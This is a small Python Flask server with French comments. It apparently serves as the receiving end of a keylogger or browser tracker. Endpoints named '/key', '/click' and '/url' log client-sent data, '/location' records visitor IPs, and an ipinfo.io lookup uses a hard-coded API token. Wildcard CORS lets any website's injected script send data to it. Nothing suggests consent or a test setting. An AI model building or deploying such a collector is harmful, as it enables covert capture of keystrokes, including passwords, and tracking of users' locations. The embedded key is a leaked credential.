import requests
from flask import Flask, request, jsonify

app = Flask(__name__)
port = 3000

API_KEY = '85deca6bff1f8b'  # Remplace par ta clé API ipinfo.io

def get_ip_info(ip):
    url = f'https://ipinfo.io/{ip}?token={API_KEY}'
    response = requests.get(url)
    return response.json()

# Middleware pour gérer les en-têtes CORS
@app.after_request
def add_cors_headers(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Headers'] = 'Origin, X-Requested-With, Content-Type, Accept'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
    return response

# Route pour envoyer une réponse simple pour la route GET
@app.route('/', methods=['GET'])
def hello_world():
    return 'Hello World!'

# Route pour recevoir les données du client - key
@app.route('/url', methods=['POST'])
def receive_url():
    received_data = request.json
    print('url :', received_data)
    return 'Données reçues'


@app.route('/key', methods=['POST'])
def receive_key():
    received_data = request.json
    print('Données reçues key :', received_data)
    return 'Données reçues'

# Route pour recevoir les données du client - click
@app.route('/click', methods=['POST'])
def receive_click():
    received_data = request.json
    print('Données reçues click :', received_data)
    return 'Données reçues'

# Route pour recevoir les données de localisation
@app.route('/location', methods=['POST'])
def receive_location():
    if request.headers.get('X-Forwarded-For'):
        visitor_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    else:
        visitor_ip = request.remote_addr
    
    received_data = request.json
    print(f'Données de localisation reçues de {visitor_ip}: {received_data}')
    return 'Données de localisation reçues par le serveur'


# Démarrer le serveur Flask
if __name__ == '__main__':
    app.run(port=port)
